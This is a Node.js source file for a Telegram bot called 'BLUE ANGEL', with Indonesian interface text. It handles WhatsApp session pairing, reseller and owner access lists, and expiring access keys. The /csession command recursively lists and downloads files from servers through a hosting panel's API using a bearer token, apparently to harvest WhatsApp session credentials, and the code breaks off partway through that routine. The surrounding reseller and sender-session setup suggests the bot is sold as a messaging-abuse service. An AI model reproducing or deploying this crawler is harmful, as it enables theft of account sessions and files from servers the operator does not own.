const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch");
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
//const { InlineKeyboard } = require("grammy");
const { spawn } = require('child_process');
const {
default: makeWASocket,
makeCacheableSignalKeyStore,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion,
fetchLatestWaWebVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
generateWAMessageFromContent,
generateMessageTag,
generateMessageID,
downloadContentFromMessage,
makeInMemoryStore,
getContentType,
jidDecode,
MessageRetryMap,
getAggregateVotesInPollMessage,
proto,
delay
} = require("@whiskeysockets/baileys");

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

app.use(cors());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const userEvents = new Map(); 
let userApiBug = null;
let pian;


function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [8100399804],
      akses: [8100399804],
      resellers: [8100399804],
      pts: [8100399804],
      moderators: [8100399804]
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  let data = JSON.parse(fs.readFileSync(file));

  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}


function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
    console.log("✓ Data user berhasil disimpan.");
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

function loadUserSessions() {
  if (!fs.existsSync(userSessionsPath)) {
    console.log(`[SESSION] 📂 Creating new user_sessions.json`);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
  
  try {
    const data = JSON.parse(fs.readFileSync(userSessionsPath, "utf8"));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 📂 Loaded ${sessionCount} sessions from ${Object.keys(data).length} users`);
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error loading user_sessions.json, resetting:", err);
    
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function saveUserSessions(data) {
  try {
    fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 💾 Saved ${sessionCount} sessions for ${Object.keys(data).length} users`);
  } catch (err) {
    console.error("❌ Gagal menyimpan user_sessions.json:", err);
  }
}

function sendEventToUser(username, eventData) {
  if (userEvents.has(username)) {
    const res = userEvents.get(username);
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch (err) {
      console.error(`[Events] Error sending to ${username}:`, err.message);
      userEvents.delete(username);
    }
  }
}

bot.command("addreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isPT(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addreseller <id>");

  const data = loadAkses();
  if (data.resellers.includes(id)) return ctx.reply("✗ Already a reseller.");

  data.resellers.push(id);
  saveAkses(data);
  ctx.reply(`✓ Reseller added: ${id}`);
});

bot.command("delreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delreseller <id>");

  const data = loadAkses();
  data.resellers = data.resellers.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Reseller removed: ${id}`);
});

bot.command("addpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addpt <id>");

  const data = loadAkses();
  if (data.pts.includes(id)) return ctx.reply("✗ Already PT.");

  data.pts.push(id);
  saveAkses(data);
  ctx.reply(`✓ PT added: ${id}`);
});

bot.command("delpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delpt <id>");

  const data = loadAkses();
  data.pts = data.pts.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ PT removed: ${id}`);
});

bot.command("addmod", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addmod <id>");

  const data = loadAkses();
  if (data.moderators.includes(id)) return ctx.reply("✗ Already Moderator.");

  data.moderators.push(id);
  saveAkses(data);
  ctx.reply(`✓ Moderator added: ${id}`);
});

bot.command("delmod", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delmod <id>");

  const data = loadAkses();
  data.moderators = data.moderators.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Moderator removed: ${id}`);
});

// ==================== AUTO RELOAD SESSIONS ON STARTUP ==================== //
let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
  
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No sessions to reload - waiting for users to add senders');
    return;
  }
  
  console.log(`📋 Found ${Object.keys(userSessions).length} users with sessions`);
  simpleReloadSessions();
  
  setTimeout(() => {
    const activeSessionCount = sessions.size;
    console.log(`📊 Current active sessions: ${activeSessionCount}`);
    
    if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`);
      forceReloadWithRetry();
    } else if (activeSessionCount === 0) {
      console.log('❌ All reload attempts failed - manual reconnection required');
    } else {
      console.log(`✅ SUCCESS: ${activeSessionCount} sessions active`);
    }
  }, 30000);
}

function simpleReloadSessions() {
  console.log('=== 🔄 SESSION RELOAD STARTED ===');
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No user sessions found - waiting for users to add senders');
    return;
  }

  let totalProcessed = 0;
  let successCount = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Processing user: ${username} with ${numbers.length} senders`);
    
    numbers.forEach(number => {
      totalProcessed++;
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Attempting to reconnect: ${number} for ${username}`);
        
        connectToWhatsAppUser(username, number, sessionDir)
          .then(pian => {
            successCount++;
            console.log(`✅ Successfully reconnected: ${number}`);
          })
          .catch(err => {
            console.log(`❌ Failed to reconnect ${number}: ${err.message}`);
          });
      } else {
        console.log(`⚠️ No session files found for ${number}, skipping`);
      }
    });
  }
  
  console.log(`📊 Reload summary: ${successCount}/${totalProcessed} sessions reconnected`);
}

const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
  try {
    console.log(`[${username}] 🚀 Starting WhatsApp connection for ${BotNumber}`);
    
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai koneksi WhatsApp...',
      number: BotNumber,
      status: 'connecting'
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    const userSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[${username}] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[${username}] ❌ Connection closed with status:`, statusCode);

          sessions.delete(BotNumber);
          console.log(`[${username}] 🗑️ Removed ${BotNumber} from sessions map`);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[${username}] 📵 Device logged out, cleaning session...`);
            sendEventToUser(username, {
              type: 'error',
              message: 'Device logged out, silakan scan ulang',
              number: BotNumber,
              status: 'logged_out'
            });
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out, please pairing again"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut) {
            console.log(`[${username}] 🔄 Reconnecting...`);
            sendEventToUser(username, {
              type: 'status',
              message: 'Mencoba menyambung kembali...',
              number: BotNumber,
              status: 'reconnecting'
            });
            
            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            sendEventToUser(username, {
              type: 'error',
              message: `Koneksi gagal dengan status: ${statusCode}`,
              number: BotNumber,
              status: 'failed'
            });
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[${username}] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();
          
          sessions.set(BotNumber, userSock);
          
          sendEventToUser(username, {
            type: 'success',
            message: 'Berhasil terhubung dengan WhatsApp!',
            number: BotNumber,
            status: 'connected'
          });
          
          const userSessions = loadUserSessions();
  if (!userSessions[username]) {
    userSessions[username] = [];
  }
  if (!userSessions[username].includes(BotNumber)) {
    userSessions[username].push(BotNumber);
    saveUserSessions(userSessions);
    console.log(`[${username}] 💾 Session saved for ${BotNumber}`);
  }
          
          resolve(userSock);
        }

        if (connection === "connecting") {
          console.log(`[${username}] 🔄 Connecting to WhatsApp...`);
          sendEventToUser(username, {
            type: 'status',
            message: 'Menghubungkan ke WhatsApp...',
            number: BotNumber,
            status: 'connecting'
          });
          
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            setTimeout(async () => {
              try {
                console.log(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`);
                sendEventToUser(username, {
                  type: 'status',
                  message: 'Meminta kode pairing...',
                  number: BotNumber,
                  status: 'requesting_code'
                });
                
                const code = await userSock.requestPairingCode(BotNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 PAIRING CODE - ${username}`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Nomor Sender : ${BotNumber}`);
                console.log(`║  Kode Pairing : ${formattedCode}`);
                console.log(`╚═══════════════════════════════════╝`);
                
                sendEventToUser(username, {
                  type: 'pairing_code',
                  message: 'Kode Pairing Berhasil Digenerate!',
                  number: BotNumber,
                  code: formattedCode,
                  status: 'waiting_pairing',
                  instructions: [
                    '1. Buka WhatsApp di HP Anda',
                    '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                    '3. Masukkan kode pairing berikut:',
                    `KODE: ${formattedCode}`,
                    '4. Kode berlaku 30 detik!'
                  ]
                });
                
              } catch (err) {
                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                sendEventToUser(username, {
                  type: 'error',
                  message: `Gagal meminta kode pairing: ${err.message}`,
                  number: BotNumber,
                  status: 'code_error'
                });
              }
            }, 3000);
          }
        }

        if (qr) {
          console.log(`[${username}] 📋 QR Code received`);
          sendEventToUser(username, {
            type: 'qr',
            message: 'Scan QR Code berikut:',
            number: BotNumber,
            qr: qr,
            status: 'waiting_qr'
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);
      
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          sendEventToUser(username, {
            type: 'error', 
            message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 120 detik',
            number: BotNumber,
            status: 'timeout'
          });
          cleanup();
          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
    sendEventToUser(username, {
      type: 'error',
      message: `Error: ${error.message}`,
      number: BotNumber,
      status: 'error'
    });
    throw error;
  }
};

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Usuário";

  const teks = `
<blockquote>BLUE ANGEL</blockquote>
<i>Now blue angel has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @NakanoXv</b>
<b>Support : @Sanzxyzbca<b>
<b>Version   : 2 ⧸ <code>IV</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    ["🔑 Create Menu", "🔐 Access Menu"],
    ["ℹ️ Bot Info", "💬 Chat"],
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  await ctx.reply(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
});

bot.hears("🔑 Create Menu", async (ctx) => {
  const orbixMenu = `
<blockquote>BLUE ANGEL</blockquote>
<i>These are some settings menu</i>

<b>🔑 Create Menu</b>
• /addkey
• /listkey
• /delkey
`;

  await ctx.reply(orbixMenu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("BLACK", "https://t.me/Sanzxyzbca") ]
    ]).reply_markup
  });
});

bot.hears("🔐 Access Menu", async (ctx) => {
  const accessMenu = `
<blockquote>BLACK XOSLEY</blockquote>
<i>This is the menu to take user access</i>

<b>🔐 Access Menu</b>
• /addacces
• /delacces
• /addowner
• /delowner
• /addreseller
• /delreseller
• /addpt
• /delpt
• /addmod
• /delmod
`;

  await ctx.reply(accessMenu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("BLACK", "https://t.me/@NakanoXv") ]
    ]).reply_markup
  });
});

bot.hears("ℹ️ Bot Info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>BLUE ANGEL</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @NakanoXv for Developer
Contact @Sanzxyzbca for Support
`;

  await ctx.reply(infoText, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("BLACK", "https://t.me/NakanoXvC") ]
    ]).reply_markup
  });
});

bot.hears("💬 Chat", (ctx) => {
  ctx.reply("💬 Chat dengan developer: https://t.me/Sanzxyzbca");
});

bot.hears("📢 Channel", (ctx) => {
  ctx.reply("📢 Channel updates: https://t.me/NakanoXvC");
});

bot.action("show_orbix_menu", async (ctx) => {
  const orbixMenu = `
<blockquote>BLUE ANGEL</blockquote>
<i>These are some settings menu</i>

<b>🔑 Create Menu</b>
• /addkey
• /listkey
• /delkey
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("BLACK", "https://t.me/Sanzxyzbca") ]
  ]);

  await ctx.editMessageText(orbixMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_access_menu", async (ctx) => {
  const accessMenu = `
<blockquote>Access Menu</blockquote>
<i>This is the menu to take user access</i>

<b>🔑 Access Menu</b>
• /addacces
• /delacces
• /addowner
• /delowner
• /addreseller
• /delreseller
• /addpt
• /delpt
• /addmod
• /delmod
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("BLACK", "https://t.me/NakanoXv") ]
  ]);

  await ctx.editMessageText(accessMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_bot_info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>BLUE ANGEL</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @NakanoXv for Developer
Contact @Sanzxyzbca for Support System
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("BLACK", "https://t.me/Sanzxyzbca") ]
  ]);

  await ctx.editMessageText(infoText, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("back_to_main", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Usuário";
  
  const teks = `
<blockquote>BLUE ANGEL</blockquote>
<i>Now The Orbix has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @NakanoXv</b>
<b>Support : @Sanzxyzbca
<b>Version   : 2 ⧸ <code>IV</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    ["🔑 Create Menu", "🔐 Access Menu"],
    ["ℹ️ Bot Info", "💬 Chat"],
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  await ctx.editMessageText(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.command("sessions", (ctx) => {
  const userSessions = loadUserSessions();
  const activeSessions = sessions.size;
  
  let message = `📊 **Session Status**\n\n`;
  message += `**Active Sessions:** ${activeSessions}\n`;
  message += `**Registered Users:** ${Object.keys(userSessions).length}\n\n`;
  
  Object.entries(userSessions).forEach(([username, numbers]) => {
    message += `**${username}:** ${numbers.length} sender(s)\n`;
    numbers.forEach(number => {
      const isActive = sessions.has(number);
      message += `  - ${number} ${isActive ? '✅' : '❌'}\n`;
    });
  });
  
  ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("addkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini\n\nExample :\n• /addkey sanz,1d\n• /addkey sanz,1d,aii", { parse_mode: "HTML" });
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const customKey = parts[2] ? parts[2].trim() : null;

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✓ <b>Key berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `𞅏 𝑨𝒄𝒕𝒊𝒗𝒆 𝑲𝒆𝒚 𝑳𝒊𝒔𝒕:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey kontol");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addacces 7947266803", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delacces 7947266803", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addowner 7947266803", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delowner  7947266803", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.command("getcode", async (ctx) => {
    const chatId = ctx.chat.id;
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = input;

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

            fs.unlinkSync(filePath);
        } else {
            await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        ctx.reply("❌ Error fetching website source code. Please try again later.");
    }
});

bot.command("csession", async (ctx) => {
  const DEBUG_CS = false;
  const SEND_TO_CALLER = false;
  const REQUEST_DELAY_MS = 250;
  const MAX_DEPTH = 12;
  const MAX_SEND_TEXT = 3500;
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  function isDirectory(item) {
    if (!item) return false;
    const a = item.attributes || {};
    const checks = [
      a.type, a.mode, item.type, item.mode,
      a.is_directory, a.isDir, a.directory,
      item.is_directory, item.isDir, item.directory
    ];
    for (let c of checks) {
      if (typeof c === "string") {
        const lc = c.toLowerCase();
        if (lc === "dir" || lc === "directory" || lc === "d") return true;
        if (lc === "file" || lc === "f") return false;
      }
      if (c === true) return true;
      if (c === false) return false;
    }
    return false;
  }

  function normalizeDir(dir) {
    if (!dir) return "/";
    let d = String(dir).replace(/\/+/g, "/");
    if (!d.startsWith("/")) d = "/" + d;
    if (d.length > 1 && d.endsWith("/")) d = d.slice(0, -1);
    return d;
  }

  function extractNameAndMaybeFullPath(item) {
    const a = item.attributes || {};
    const candidates = [a.name, item.name, a.filename, item.filename, a.path, item.path];
    for (let c of candidates) {
      if (!c) continue;
      const s = String(c).trim();
      if (s) return s;
    }
    for (let k of Object.keys(item)) {
      if (/name|file|path|filename/i.test(k) && item[k]) return String(item[k]);
    }
    return "";
  }

  async function apiListFiles(domainBase, identifier, dir) {
    try {
      const res = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
      });
      return res.data;
    } catch (e) {
      if (DEBUG_CS) console.error("apiListFiles error", e && (e.response && e.response.data) ? e.response.data : e.message);
      return null;
    }
  }

  async function tryDownloadFile(domainBase, identifier, absFilePath) {
    const candidates = [];
    const p = String(absFilePath || "").replace(/\/+/g, "/");
    if (!p) return null;
    candidates.push(p.startsWith("/") ? p : "/" + p);
    const noLead = p.startsWith("/") ? p.slice(1) : p;
    if (!candidates.includes("/" + noLead)) candidates.push("/" + noLead);
    candidates.push(noLead);

    for (let c of candidates) {
      try {
        const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, {
          params: { file: c },
          headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
        });
        if (dlMeta && dlMeta.data && dlMeta.data.attributes && dlMeta.data.attributes.url) {
          const url = dlMeta.data.attributes.url;
          const fileRes = await axios.get(url, { responseType: "arraybuffer" });
          return { buffer: Buffer.from(fileRes.data), meta: dlMeta.data };
        }
      } catch (e) {
        if (DEBUG_CS) console.error("tryDownloadFile attempt", c, e && (e.response && e.response.data) ? e.response.data : e.message);
      }
      await sleep(REQUEST_DELAY_MS);
    }
    return null;
  }

  async function traverseAndFind(domainBase, identifier, dir = "/", depth = 0) {
    dir = normalizeDir(dir);
    if (depth > MAX_DEPTH) return [];
    const listJson = await apiListFiles(domainBase, identifier, dir);
    if (!listJson || !Array.isArray(listJson.data)) return [];

    if (DEBUG_CS) {
